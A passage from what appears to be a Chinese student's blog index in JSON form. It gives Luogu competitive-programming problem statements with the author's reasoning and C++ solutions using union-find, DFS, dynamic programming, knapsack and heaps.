int y) { x = Find(x); y = Find(y); if(l[x].s == y) return true; if(l[y].f != y) { if(Equal(x, l[y].f)) return true; else return false; } else if(l[x].s != x) { if(Equal(l[x].s, y)) return true; else return false; } else { l[x].s = y; l[y].f = x; if(l[y].s != y) { if(l[x].f != x) Union(l[x].f, l[y].s); else { l[x].f = l[y].s; l[l[y].s].s = x; } } l[l[x].s].s = l[x].s; l[l[x].f].f = l[x].f; Connect(x); return true; } } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;k); for(int i = 1; i &lt;= n; i++) father[i] = l[i].f = l[i].s = i; int j, x, y, sum = 0; for(int i = 1; i &lt;= k; i++) { scanf(&quot;%d%d%d&quot;, &amp;j, &amp;x, &amp;y); if(j == 1) { if(x &gt; n || y &gt; n)sum++; else if(x != y &amp;&amp; !Equal(x, y)) sum++; } else if(j == 2) { if(x &gt; n || y &gt; n)sum++; else if(x == y)sum++; else if(!BeEaten(x, y)) sum++; } } printf(&quot;%d\\n&quot;, sum); } 后话好久没更新了鸭！关键是沉迷于各种游戏和做游戏无法自拔，忘了懒得写题了QAQ 总之今后会一点一点慢慢来的！奥利给","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"并查集","slug":"并查集","permalink":"https://v25bh145.github.io/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"},{"name":"链表","slug":"链表","permalink":"https://v25bh145.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"Question-P2502","date":"2020-01-11T01:24:52.000Z","path":"2020/01/11/coding/questions/Question-P2502/","text":"P2502题目描述Z小镇是一个景色宜人的地方，吸引来自各地的观光客来此旅游观光。Z小镇附近共有N个景点（编号为1,2,3,…,N），这些景点被M条道路连接着，所有道路都是双向的，两个景点之间可能有多条道路。也许是为了保护该地的旅游资源，Z小镇有个奇怪的规定，就是对于一条给定的公路Ri，任何在该公路上行驶的车辆速度必须为Vi。速度变化太快使得游客们很不舒服，因此从一个景点前往另一个景点的时候，大家都希望选择行使过程中最大速度和最小速度的比尽可能小的路线，也就是所谓最舒适的路线。 输入格式第一行包含两个正整数，N和M。 接下来的M行每行包含三个正整数：x，y和v。表示景点x到景点y之间有一条双向公路，车辆必须以速度v在该公路上行驶。 最后一行包含两个正整数s，t，表示想知道从景点s到景点t最大最小速度比最小的路径。s和t不可能相同。 输出格式如果景点s到景点t没有路径，输出“IMPOSSIBLE”。否则输出一个数，表示最小的速度比。如果需要，输出一个既约分数。 输入输出样例输入4 2 1 2 1 3 4 2 1 4 输出IMPOSSIBLE 输入3 3 1 2 10 1 2 5 2 3 8 1 3 输出5/4 输入3 21 2 22 3 41 3 输出2 说明/提示【数据范围】 1&lt;N≤500 1≤x,y≤N，0&lt;v&lt;30000，x≠y 0&lt;M≤5000 听歌儿 解(人在机房，刚被囚禁，闲来无事写写博客，利益相关，匿了匿了) 一看数据范围，N至多500，第一个想到的算法是搜索，其要求的是最大速度/最小速度，(难道要求记录历史的所有速度？？) 所以放弃爆搜廖 之后想到了迪杰的堆优化贪心，(甚至还打了一遍)发现贪心策略不适合这个，因为速度要求的是极差最小，所以这种贪心只拿了30 (居然还拿了30？？) 最后翻了翻题解….emm 可以用类似最小生成树的算法做，先排序一遍，从最大开始，先遍历一遍，再从第一遍遍历的节点向后，一遍循环终止条件是起始点和终止点连接，最后记下最大速度/最小速度的值 (其实就是枚举辣！) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 550 #define M 5500 #define inf 0x7fffffff using namespace std; int n, m, tmp1, tmp2, tmp3, father[N], st, ed; struct Edge { int x, y, v; bool operator &lt; (const Edge a) const { return a.v &lt; v; } }edge[M]; int Find(int x)//并查集 { if(x != father[x]) father[x] = Find(father[x]); return father[x]; } int Union(int x, int y) { father[Find(x)] = Find(father[y]); } bool Judge(int x, int y) { if(Find(x) == Find(y)) return true; else return false; } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(int i = 1; i &lt;= m; i++) { scanf(&quot;%d%d%d&quot;, &amp;tmp1, &amp;tmp2, &amp;tmp3); edge[i].x = tmp1; edge[i].y = tmp2; edge[i].v = tmp3; } scanf(&quot;%d%d&quot;, &amp;st, &amp;ed); sort(edge + 1, edge + 1 + m); int Max = inf, Min = 1; for(int i = 1, tmpN; i &lt;= m; i++) { for(int j = 1; j &lt;= n; j++) father[j] = j; for(tmpN = i; tmpN &lt;= m; tmpN++) { Union(edge[tmpN].x, edge[tmpN].y); if(Judge(st, ed)) break; } if(tmpN &lt;= m &amp;&amp; edge[i].v / (double)edge[tmpN].v &lt; Max / (double)Min)//这里记得转换成小数除法比较 { Max = edge[i].v; Min = edge[tmpN].v; } } if(Max == inf) printf(&quot;IMPOSSIBLE\\n&quot;); else { int num = __gcd(Max, Min); if(Min == num) printf(&quot;%d\\n&quot;, Max / num); else printf(&quot;%d/%d\\n&quot;, Max / num, Min / num); } } 时间复杂度：O($n^{2}$)最后一个带问题：将重载的运算符换成&gt;=就会出问题，为什么鸭？？？爆了两个WA和一个MLE","tags":[{"name":"搜索","slug":"搜索","permalink":"https://v25bh145.github.io/tags/%E6%90%9C%E7%B4%A2/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"最小生成树","slug":"最小生成树","permalink":"https://v25bh145.github.io/tags/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91/"}]},{"title":"Question-P1019","date":"2019-12-18T11:44:30.000Z","path":"2019/12/18/coding/questions/Question-P1019/","text":"P1019题目描述单词接龙是一个与我们经常玩的成语接龙相类似的游戏，现在我们已知一组单词，且给定一个开头的字母，要求出以这个字母开头的最长的“龙”（每个单词都最多在“龙”中出现两次），在两个单词相连时，其重合部分合为一部分，例如 beastbeast和astonishastonish，如果接成一条龙则变为beastonishbeastonish，另外相邻的两部分不能存在包含关系，例如atat 和 atideatide 间不能相连。 输入格式输入的第一行为一个单独的整数n (n≤20)表示单词数，以下n 行每行有一个单词，输入的最后一行为一个单个字符，表示“龙”开头的字母。你可以假定以此字母开头的“龙”一定存在. 输出格式只需输出以此字母开头的最长的“龙”的长度 输入输出样例输入 #15 at touch cheat choose tact a 输出 #123 说明/提示（连成的“龙”为atoucheatactactouchoose） NOIp2000提高组第三题 听歌儿 MC大法好 解康康数据规模，这题就是暴力枚举/线性的深度优先搜索 这样枚举(套用DFS模板即可)： Enum(last: int) 从1至nif 位置为i的单词尚未超过使用限额 且 位置为i的单词头部可以和上一个使用的单词尾部连接则 连接上此单词 将此单词标记为使用一次 递归Enum(i) 将此单词标记为取消使用一次 取消连接此单词继续循环 难点在于连接与取消连接 连接（融♂合）顺序遍历一遍字符串和接龙，计算他们最小重叠的长度 例如， C#nb 和 nb 的最小重叠长度就是2 如果最小重叠长度等于其中一个字符串的长度(也就是说覆盖辣)，这肯定是不行的鸭 之后进行连接操作，从重叠的那里连接就完事儿了 取消连接这个函数必须要传入三个值啊，接龙，上个连接的单词和这个连接的单词 我们需要算出两个单词的最小重叠长度，之后再使接龙部分减去这个单词没有重叠的部分 例如，hiahiahiahiahiahiahhh, hiahiahia, hiahhh 就必须算出最小重叠长度，之后使接龙减去没有重叠的部分就可以了 杂项的操作比如程序要求第一个开头固定，那我们就将接龙初始化为那个开头字母，之后第一次枚举的时候传入last = 0表示没有上一个单词的，然后在连接和取消连接的那里做一个spj(special judge) 代码#include &lt;iostream&gt; #include &lt;string&gt; #include &lt;cstring&gt; using namespace std; string words[22], sentence; char start; int n, MAX = 0; int isUsed[22]; void CancelConnect(int position, int last) { string tmp = words[position]; if(last == 0) { sentence = string(sentence.begin(), sentence.end() - tmp.length()); return; } string sLast = words[last]; int length = min(sLast.length(), tmp.length()); int radix = 0; for(int i = 0; i &lt; length; i++) { string s1 = string(sLast.end() - i, sLast.end()); string s2 = string(tmp.begin(), tmp.begin() + i); if(s1 == s2 &amp;&amp; s1.length() != 0) { if(radix == 0) radix = s1.length(); else radix = radix &lt; s1.length() ? radix : s1.length(); } } sentence = string(sentence.begin(), sentence.end() - tmp.length() + radix); } bool Connect(int position, int last) { string tmp = words[position]; int radix = 0; int length = min(sentence.length(), tmp.length()); for(int i = 0; i &lt;= length - 1; i++) { string s1 = string(sentence.end() - i, sentence.end()); string s2 = string(tmp.begin(), tmp.begin() + i); if(s1 == s2 &amp;&amp; s1.length() != 0) { if(radix == 0) radix = s1.length(); else radix = radix &lt; s1.length() ? radix : s1.length(); } } if(radix == 0 &amp;&amp; last != 0)//这里就是spj return false; string result = string(tmp.begin() + radix, tmp.end()); sentence = sentence + result; return true; } void Enum(int last) { MAX = MAX &gt; sentence.length() ? MAX : sentence.length(); for(int i = 1; i &lt;= n; i++) if(isUsed[i] &lt;= 1) { string sTmp = words[i]; if(last == 0 &amp;&amp; sTmp[0] != start) continue; if(Connect(i, last) == true) { isUsed[i]++; Enum(i); isUsed[i]--; CancelConnect(i, last); } } } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) isUsed[i] = 0; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;words[i]; cin&gt;&gt;start; sentence = string(1, start); Enum(0); cout&lt;&lt;MAX - 1&lt;&lt;endl; return 0; } 一开始太菜算成了最大重叠长度 写博客有点晚了，现在逐渐开始习惯输入进去C字符串scanf(%s, c);然后string s = string(c)了2333","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"深度优先搜索","slug":"深度优先搜索","permalink":"https://v25bh145.github.io/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"}]},{"title":"Question-P1280","date":"2019-12-11T14:23:59.000Z","path":"2019/12/11/coding/questions/Question-P1280/","text":"P1280题目描述尼克每天上班之前都连接上英特网，接收他的上司发来的邮件，这些邮件包含了尼克主管的部门当天要完成的全部任务，每个任务由一个开始时刻与一个持续时间构成。 尼克的一个工作日为N分钟，从第一分钟开始到第N分钟结束。当尼克到达单位后他就开始干活。如果在同一时刻有多个任务需要完成，尼克可以任选其中的一个来做，而其余的则由他的同事完成，反之如果只有一个任务，则该任务必需由尼克去完成，假如某些任务开始时刻尼克正在工作，则这些任务也由尼克的同事完成。如果某任务于第P分钟开始，持续时间为T分钟，则该任务将在第P+T-1分钟结束。 写一个程序计算尼克应该如何选取任务，才能获得最大的空暇时间。 输入格式输入数据第一行含两个用空格隔开的整数N和K(1≤N≤10000，1≤K≤10000)，N表示尼克的工作时间，单位为分钟，K表示任务总数。 接下来共有K行，每一行有两个用空格隔开的整数P和T，表示该任务从第P分钟开始，持续时间为T分钟，其中1≤P≤N，1≤P+T-1≤N。 输出格式输出文件仅一行，包含一个整数，表示尼克可能获得的最大空暇时间。 输入输出样例输入 #115 6 1 2 1 6 4 11 8 5 8 1 11 5 输出 #14 听音乐 炒鸡柔和的诶 (不愧是近月少女哈哈哈哈) 解资源分配型的DP问题 我们的资源是时间与工作，这里先模拟一下情况： (手绘好丑) 这里选择的最优解是第二条和第四条，第二条规避了第一条和第三条，第四条规避了第五条和第六条 这里我们可以再转变一下表示类型，变成有向图 是不是很清楚了？ f[i] = (f[i节点的前接节点j] + w[i][j] , f[i]) 怎么初始化呢？首先我们要对起始时间排序 只设置入度为零的点为初始化点，即起始时间最短的点，赋值为起始时间，考虑这样的点有多个，需要循环 之后默认每个点都不可达，为无穷小 怎么判断一个节点j是否是另外一个节点i的前接节点呢具有两条性质： j的终止时间在i的终止时间前面 没有任何一个节点的起始时间在 j的终止时间到i的起始时间的时间段内 1是2的特殊化 第二条怎么实现呢？ 倒序遍历i前的所有节点，设第一个与i起始值不一样的节点k，k节点的起始值就是判断的标准，且k节点一定为i节点的前接节点 *证明 k节点一定是i节点的前接节点 反证：若k节点不是i节点的前接节点，则一定有一个节点u的起始值在i的起始值之前k的末尾值之后，又知1~i-1的节点中k节点的起始值离i最近，所以这样的u不存在 k节点的起始值是判断的标准，若有u节点在k节点起始值至i节点起始值之间，则u是i的前接节点 反证：若u节点不是i的前接节点，则一定有一个节点v的起始值在u的末尾与i的起始之间，又知1~i-1的节点中k节点的起始值离i最近，所以这样的v不存在 上代码扒 #include &lt;iostream&gt; #include &lt;algorithm&gt; using namespace std; int N, K, f[10050], jud[10050]; struct Node { int start; int end; }a[10050]; bool cmp(Node x, Node y) { if(x.start &lt; y.start) return true; else return false; } int main() { cin&gt;&gt;N&gt;&gt;K; int tmp; for(int i = 1; i &lt;= K; i++) { cin&gt;&gt;a[i].start&gt;&gt;tmp; a[i].end = a[i].start + tmp - 1; } //系统排序，以起始时间升序 sort(a + 1, a + 1 + K, cmp); //初始化不可达点与可达点 for(int i = 0; i &lt;= K; i++) f[i] = -1000000; f[1] = a[1].start - 1; int first = 2; while(a[first].start == a[1].start) { f[first] = a[1].start - 1; first++; } int mid, head; for(int i = 2; i &lt;= K; i++) { head = i - 1; //确定判断基准 while(a[head].start == a[i].start) head--; if(head == 0) head = 1; mid = a[head].start; for(int j = i - 1; j &gt;= 1; j--) if(a[j].end &lt; a[i].start &amp;&amp; a[j].end &gt;= mid) //转移方程 f[i] = max(f[i], f[j] + a[i].start - a[j].end - 1); } //对尾部时间操作，以最后一位的起始时间为基准 for(int i = 1; i &lt;= K; i++) if(a[i].end &gt;= a[K].start) f[i] += N - a[i].end; int MAX = f[1]; for(int i = 2; i &lt;= K; i++) MAX = MAX &gt; f[i] ? MAX : f[i]; cout&lt;&lt;MAX&lt;&lt;endl; return 0; } 写在最后这道题花了我一天啊！！！ 一道DP绿题QAQ 当然题的做法也可以DP总时间，我这里DP了工作数量 DP大法好！！ (然鹅我还是不会啊QAQ) (逃)","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"}]},{"title":"Question-P1064","date":"2019-12-09T13:27:22.000Z","path":"2019/12/09/coding/questions/Question-P1064/","text":"P1064题目描述金明今天很开心，家里购置的新房就要领钥匙了，新房里有一间金明自己专用的很宽敞的房间。更让他高兴的是，妈妈昨天对他说：“你的房间需要购买哪些物品，怎么布置，你说了算，只要不超过NN元钱就行”。今天一早，金明就开始做预算了，他把想买的物品分为两类：主件与附件，附件是从属于某个主件的，下表就是一些主件与附件的例子： 主件 附件 电脑 打印机，扫描仪 书柜 图书 书桌 台灯，文具 工作椅 无 如果要买归类为附件的物品，必须先买该附件所属的主件。每个主件可以有0个、1个或2个附件。附件不再有从属于自己的附件。金明想买的东西很多，肯定会超过妈妈限定的N元。于是，他把每件物品规定了一个重要度，分为5等：用整数1-5表示，第5等最重要。他还从因特网上查到了每件物品的价格（都是10元的整数倍）。他希望在不超过N元（可以等于N元）的前提下，使每件物品的价格与重要度的乘积的总和最大。 设第j件物品的价格为v[j]，重要度为w[j]，共选中了k件物品，编号依次为 $j_{1},j_{2},……,j_{k}$ ，则所求的总和为： v[j1] w[j1] + v[j2] w[j2] + …… ＋ v[jk] * w[jk] 请你帮助金明设计一个满足要求的购物单。 输入格式第1行，为两个正整数，用一个空格隔开： N m （其中N(&lt;32000)表示总钱数，m(&lt;60)为希望购买物品的个数。） 从第2行到第m+1行，第j行给出了编号为j-1的物品的基本数据，每行有3个非负整数 v p q （其中v表示该物品的价格（v0，表示该物品为附件，q是所属主件的编号） 输出格式一个正整数，为不超过总钱数的物品的价格与重要度乘积的总和的最大值（&lt;200000）。 输入输出样例输入1000 5 800 2 0 400 5 1 300 5 1 400 3 0 500 2 0 输出2200 说明/提示NOIP 2006 提高组 第二题 听音乐~ 解首先这道题是一个0-1型背包问题，不过加了一层限制，如果想选择附件则必须要先选择对应的主件 首先考虑n呈10的整数倍，可以将空间缩小10倍，返回的解*10 考虑分组背包，每一个组包含主件和主件的附属，矛盾的选择是主件和不同附件的排列组合这样的时间复杂度是指数级了，每一个附件有选择或不选择两种状态 考虑优化，对每一个组内部进行0-1背包处理，计算不同体积下能获得的最大价格，矛盾的选择是在选择在此组消耗的体积 最后考虑关于动态规划的数组在空间上的优化，0-1背包问题使用一维数组存储单个组解，放在分组问题中组循环的内部，分组问题使用一维数组刷新的方式 代码#include &lt;iostream&gt; using namespace std; int N, m, groupOptimal[3250], optimal[3250]; int mGroup = 0; struct Group { int value; int cost; int sonValue[62]; int sonCost[62]; int length; } k[62]; int main() { cin&gt;&gt;N&gt;&gt;m; N = N / 10; for(int i = 0; i &lt;= m; i++) { //初始化操作,-1代表不存在 k[i].value = -1; k[i].length = 0; } int tmpValue, tmpPrior, tmpOf; for(int i = 1; i &lt;= m; i++) { cin&gt;&gt;tmpValue&gt;&gt;tmpPrior&gt;&gt;tmpOf; if(tmpOf == 0) { k[i].value = tmpValue * tmpPrior / 10; k[i].cost = tmpValue / 10; } else { k[tmpOf].length++; k[tmpOf].sonValue[k[tmpOf].length] = tmpValue * tmpPrior / 10; k[tmpOf].sonCost[k[tmpOf].length] = tmpValue / 10; } } for(int i = 1; i &lt;= m; i++) if(k[i].value != -1) //若组存在，则组的数目自增1 { mGroup++; swap(k[mGroup], k[i]); } for(int i = 1; i &lt;= mGroup; i++) //动态规划数组初始化，放入主件 { for(int j = 0; j &lt;= N; j++) { if(j &gt;= k[i].cost) groupOptimal[j] = k[i].value; else groupOptimal[j] = -100000000; } for(int v = 1; v &lt;= k[i].length; v++) for(int j = N; j &gt;= k[i].cost; j--) if(j - k[i].sonCost[v] &gt;= 0) groupOptimal[j] = max(groupOptimal[j], groupOptimal[j - k[i].sonCost[v]] + k[i].sonValue[v]); for(int j = N; j &gt;= 0; j--) for(int u = j; u &gt;= k[i].cost; u--) optimal[j] = max(optimal[j], optimal[j - u] + groupOptimal[u]); } cout&lt;&lt;optimal[N] * 10&lt;&lt;endl; return 0; } 复杂度：$O(m^{2}N + mN^{2})$绰绰有余辣 写在最后有没有感觉篇博客明显变短了鸭哈哈哈 我感觉我太啰嗦了，而且一般写的思考过程和试错鸭什么的辣些一般我也不会怎么看的hhhh 最近在复习 (从0基础开始学) 动态规划呢，感觉好难鸭哈哈哈 最大的问题就是转移方程的推导了嗯嗯，没看见这个转移方程的时候我根本推不出来哈哈哈 (难道是我题解看多了) 加油扒~顺便背包九讲的东东我打算往笔记本里记廖，这里就不复述辣","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"}]},{"title":"Question-P1631","date":"2019-12-04T08:12:07.000Z","path":"2019/12/04/coding/questions/Question-P1631/","text":"P1631题目描述有两个长度都是N的序列A和B，在A和B中各取一个数相加可以得到$N^{2}$个和，求这$N^{2}$个和中最小的N个。 输入格式第一行一个正整数N； 第二行N个整数$A_{i}$, 满足$A_{i}$ &lt;= $A_{i+1}$且 $A_{i}$ ≤$10^{9}$; 第三行N个整数$B_{i}$, 满足$B_{i}$ &lt;= $B_{i+1}$且 $B_{i}$ ≤$10^{9}$. 【数据规模】对于50%的数据中，满足1&lt;=N&lt;=1000； 对于100%的数据中，满足1&lt;=N&lt;=100000。 输出格式输出仅一行，包含N个整数，从小到大输出这N个最小的和，相邻数字之间用空格隔开。 输入输出样例输入 #1 3 2 6 6 1 4 8 输出 #1 3 6 7 听音乐~ 解这个题真的不难，但是非常的具有代表性QAQ 下面这个题用这个题的模板做，改改value的计算方式就AC了…… 链接：P2085 所以还不多康康这种题？！！ introa和b是以升序排布的嘛 (这一点我一开始居然没有看出来！QAQ我个瞎子) 然后求的是 a + b 的前几个最小值 从数据范围看出来要的是O(nlgn) 暴力暴力做法，那就是申个二维数组挨个算 不仅从时间上(O($n^{2}$))超了，空间也超了 在第n个小的求和之外所花费的时间和空间全部多余了 研究如何使得多余的计算被避免掉，那就需要从暴力做法还没有讨论到的特殊性质出发辣 暴力做法二维数组的性质那我们先打个表出来 横行是a数组，纵行是b数组 a\\b 1 3 4 5 7 9 1 2 4 5 6 8 10 2 3 5 6 7 9 11 4 5 7 8 9 11 13 6 7 9 10 11 13 15 8 9 11 12 13 15 17 9 10 12 14 15 17 19 很明显，最小的数字应该从左上往右下取得 还有一个性质： 如果要取(i,j)，必须要保证(i,j-1)与(i-1,j)被取得 因为(i,j-1)与(i-1,j)都比(i,j)要小 反映到图上，由于这是一条可以递归的性质，图要求这个节点的左上所构成的矩形全部被取到 然后还有个最基础的性质，(1,1)一定会被取到 那么就可以从(1,1)开始，先打印(1,1) 判断出(1,2)与(2,1)都符合比较的规则 然后比较(1,2)与(2,1) 按照图来，打印(2,1) 判断(3,1)符合规则，(2,2)由于(1,2)还没有被取到，不符合规则 比较(3,1)与(1,2) …… 注意到前面的比较被淘汰的仍然参与下一次比较 每一次比较只选出最小的值 想到了什么？？堆！ 接下来还有两个问题需要讨论： 如何判断是否符合规则 如何比较堆的值(&gt; &lt; =) 1. 如何判断是否符合规则即是判断二维数组左上角的矩形中有没有没被选择上的数字 考虑到如果(i,j)被选择到了，那么(i,j)左上角的矩形都被选择到了 所以要看(i + 1, j + 1)左上方是否有空，就是看其左方的数字的左上方是否有空，上方的数字的左上方是否有空，也就是看左方的数字是否为空，上方的数字是否为空 这不是让你递归啊=-= 就是把(i + 1,j + 1)的判断转移到了(i,j+1)与(i+1,j)上 以左边为例 判断左边是否为空，第一想到的就是设置一个矩阵……超空间了 然后依据最小的性质，可以比较左边和刚刚输出的数字，如果小就是已经输出过了 —如果左边的数字和刚刚输出的数字相等呢？那我们可以做一个规定，默认堆排序的时候在 值大小 的优先级之下比较谁更靠左 这样也解决了问题2. 代码#include &lt;iostream&gt; using namespace std; int a[105000], b[105000], n, length = 0; struct Node { int value; int left; int right; }heap[105000]; void SwapHeap(int p1, int p2) { swap(heap[p1].left, heap[p2].left); swap(heap[p1].right, heap[p2].right); swap(heap[p1].value, heap[p2].value); } void HeapifyFromDownToUp(int k) { if(k &gt; 1) { int parent = k / 2; if(heap[parent].value &gt; heap[k].value) { SwapHeap(parent, k); HeapifyFromDownToUp(parent); } else if(heap[parent].value == heap[k].value &amp;&amp; heap[parent].right &gt; heap[k].right) //在value大小的优先级之下比较right { SwapHeap(parent, k) ; HeapifyFromDownToUp(parent); } } } void HeapifyFromUpToDown(int k) { if(k &lt;= length / 2) { int rChild = k * 2 + 1; int lChild = k * 2; int minChild; if(rChild &gt; length) minChild = lChild; else { if(heap[rChild].value &lt; heap[lChild].value) minChild = rChild; else if(heap[rChild].value &gt; heap[lChild].value) minChild = lChild; else if(heap[rChild].value == heap[lChild].value) { minChild = heap[lChild].right &lt;= heap[rChild].right ? lChild : rChild; } } if(heap[minChild].value &lt; heap[k].value) { SwapHeap(minChild, k); HeapifyFromUpToDown(minChild); } else if(heap[minChild].value == heap[k].value &amp;&amp; heap[minChild].right &lt; heap[k].right) //在value大小的优先级之下比较right { SwapHeap(minChild, k); HeapifyFromUpToDown(minChild); } } } void Put(int le, int r) { length++; heap[length].left = le; heap[length].right = r; heap[length].value = a[le] + b[r]; HeapifyFromDownToUp(length); } Node Push() { Node temp; temp.left = heap[1].left; temp.right = heap[1].right; temp.value = heap[1].value; SwapHeap(1, length); length--; HeapifyFromUpToDown(1); return temp; } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;a[i]; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;b[i]; Put(1, 1); for(int i = 1; i &lt;= n; i++) { Node temp = Push(); cout&lt;&lt;temp.value&lt;&lt;&quot; &quot;; int r = temp.right; int le = temp.left; //这里有一个边界条件鸭 if(r - 1 == 0 || a[le + 1] + b[r - 1] &lt;= a[le] + b[r]) //这个小于等于就是默认规定辣 Put(le + 1, r); if(le - 1 == 0 || a[le - 1] + b[r + 1] &lt; a[le] + b[r]) Put(le, r + 1); } return 0; } 我居然把函数名搞错了还居然花了我一个下午调试 解2还可以这样想呢~ 等我先把表格搬过来，嘿咻~ a\\b 1 3 4 5 7 9 1 2 4 5 6 8 10 2 3 5 6 7 9 11 4 5 7 8 9 11 13 6 7 9 10 11 13 15 8 9 11 12 13 15 17 9 10 12 14 15 17 19 把每一行当做优先队列，将第一列的值存入堆，输出最小值时把对应的行的下一列的值放入堆 也就是把表格横着扫一遍~ 当然这是其他dalao的思路，我搬过来而已QAQ 这样想更简单了 没有什么默认规则了，代码就舒服多了QAQ #include &lt;iostream&gt; using namespace std; int a[105000], b[105000], length = 0, n; struct Node { int value; int p1; int p2; }heap[500000]; void HeapifyUTD(int k) { if(k &lt;= length / 2) { int rChild = k * 2 + 1, lChild = k * 2, minChild; if(lChild == length) minChild = lChild; else minChild = heap[lChild].value &lt; heap[rChild].value ? lChild : rChild; if(heap[k].value &gt; heap[minChild].value) { swap(heap[k], heap[minChild]); HeapifyUTD(minChild); } } } Node Get() { Node tmp; tmp.p1 = heap[1].p1; tmp.p2 = heap[1].p2; tmp.value = heap[1].value; swap(heap[1], heap[length]); length--; HeapifyUTD(1); return tmp; } void HeapifyDTU(int k) { int parent = k / 2; if(parent &gt; 0) if(heap[k].value &lt; heap[parent].value) { swap(heap[k], heap[parent]); HeapifyDTU(parent); } } void Put(int p1, int p2) { length++; heap[length].p1 = p1; heap[length].p2 = p2; heap[length].value = a[p1] + b[p2]; HeapifyDTU(length); } int main() { cin&gt;&gt;n; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;a[i]; for(int i = 1; i &lt;= n; i++) cin&gt;&gt;b[i]; for(int i = 1; i &lt;= n; i++) Put(i, 1); for(int i = 1; i &lt;= n; i++) { Node tmp = Get(); cout&lt;&lt;tmp.value&lt;&lt;&quot; &quot;; Put(tmp.p1, tmp.p2 + 1); } return 0; } 归纳： 遇见可以用 表格/暴力 做 超空间/超时间 的题,不妨先按着 表格/暴力做法 推几个数据找性质,然后根据性质选择性地从 表格/暴力做法 中筛选 需要的元素和需要的步骤 最后提一嘴 P2085 中的数组是[x][n]呢","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"堆","slug":"堆","permalink":"https://v25bh145.github.io/tags/%E5%A0%86/"},{"name":"数据结构","slug":"数据结构","permalink":"https://v25bh145.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"Question-P2278","date":"2019-11-30T14:06:45.000Z","path":"2019/11/30/coding/questions/Question-P2278/","text":"P2278题目描述写一个程序来模拟操作系统的进程调度。假设该系统只有一个CPU，每一个进程的到达时间，执行时间和运行优先级都是已知的。其中运行优先级用自然数表示，数字越大，则优先级越高。 如果一个进程到达的时候CPU是空闲的，则它会一直占用CPU直到该进程结束。除非在这个过程中，有一个比它优先级高的进程要运行。在这种情况下，这个新的（优先级更高的）进程会占用CPU，而老的只有等待。 如果一个进程到达时，CPU正在处理一个比它优先级高或优先级相同的进程，则这个（新到达的）进程必须等待。 一旦CPU空闲，如果此时有进程在等待，则选择优先级最高的先运行。如果有多个优先级最高的进程，则选择到达时间最早的。 输入格式输入包含若干行，每一行有四个自然数（均不超过10^8），分别是进程号，到达时间，执行时间和优先级。不同进程有不同的编号，不会有两个相同优先级的进程同时到达。输入数据已经按到达时间从小到大排序。输入数据保证在任何时候，等待队列中的进程不超过15000个。 输出格式按照进程结束的时间输出每个进程的进程号和结束时间。 输入输出样例输入 #11 1 5 3 2 10 5 1 3 12 7 2 4 20 2 3 5 21 9 4 6 22 2 4 7 23 5 2 8 24 2 4 输出 #11 6 3 19 5 30 6 32 8 34 4 35 7 40 2 42 听音乐~ 白2的歌就是好听鸭~ 先扯一点废话没想到这么快就又摆上优先队列了哈哈哈哈哈真是巧合呢 (我居然又一次一次过了提高+/省选-的题) ↑你飘了↑ 解其实一开始我是没想优先队列的 你想嘛，优先级最大的， 最！~ 好的用堆 (不愧是我) (我真的受堆毒害不浅啊！) 好的好的，第一个想到的问题是怎么处理堆 即： 堆排序的规则 什么时候该添加节点 什么时候该拉取节点 如何处理时间 堆排序的规则题目说了，应该选取优先度最高的，同优先度相比时间最早的 所以总体来说就是一个最大堆廖 什么时候该添加节点呢？嗯..好问题 (自吹自擂？？！) 应该在有新的进程到达的时候添加 那么该怎么判断是否进程到达呢？ 设置一个循环，每循环一次到达一个进程 什么时候该拉取节点应该在这个进程处理完毕的时候拉取吧 进程在给的时间范围内已经被处理掉，就拉取一次进程 如果按照第一个问题走，这个过程应该是递归/递推的 如何处理时间嗯..这是一个意义深远的问题，至今我们也不知道会不会有穿越时间的能力存在 (↑胡扯↑你就给我皮↑) 这里的答案就是不要把时间看成连续抽象的，把时间分段，当需要处理事件时就拉取一次时间 问出这些问题，想必你已经对过程有了个大体的认识扒 过程↓2： 依次输入每个进程的参数(四个，优先度，编号，开始时间，持续时间)↓1： 如果堆非空 计算上次输入到这次输入的时间差 如果时间差 &gt; 正在执行的进程的持续时间(即这个进程是否执行完毕) (剩余的)时间差 = 时间差 - 正在执行的进程的持续时间 拉取优先度最大的节点，维护堆的性质 继续执行1: 如果堆非空(即是否还在执行进程) 正在执行的进程的持续时间 - (剩余的)时间差 将此输入入堆，维护堆的性质 存下这次输入进程的参数，传递给下次循环 继续进行2: 算法这里使用了结构体 #include &lt;iostream&gt; #define MAXSIZE 15500 using namespace std; int length = 0; struct A { int prior; int num; int stTime; int lastTime; }maxHeap[MAXSIZE]; void SwapHeap(int p1, int p2) { swap(maxHeap[p1].lastTime, maxHeap[p2].lastTime); swap(maxHeap[p1].num, maxHeap[p2].num); swap(maxHeap[p1].prior, maxHeap[p2].prior); swap(maxHeap[p1].stTime, maxHeap[p2].stTime); } void HeapifyFromUpToDown(int position) { if(position &lt;= length / 2) { int lChild = position * 2; int rChild = position * 2 + 1; int 